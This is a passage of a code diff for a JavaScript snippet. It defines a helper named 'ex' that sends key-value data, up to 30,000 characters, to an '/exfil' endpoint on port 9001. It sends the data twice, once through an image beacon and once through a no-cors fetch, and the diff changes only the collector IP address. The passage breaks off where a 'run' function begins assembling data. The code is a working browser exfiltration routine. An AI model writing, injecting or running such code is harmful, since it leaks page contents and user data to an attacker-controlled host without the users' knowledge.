@@ -1,8 +1,8 @@
 (function () {
   function ex(k, v) {
     var q = k + '=' + encodeURIComponent(String(v || '').substring(0, 30000));
-    try { new Image().src = 'http://10.132.6.66:9001/exfil?' + q; } catch (e) {}
-    try { fetch('http://10.132.6.66:9001/exfil?' + q, { mode: 'no-cors' }); } catch (e) {}
+    try { new Image().src = 'http://10.138.131.2:9001/exfil?' + q; } catch (e) {}
+    try { fetch('http://10.138.131.2:9001/exfil?' + q, { mode: 'no-cors' }); } catch (e) {}
   }
   function run() {
     var d = {
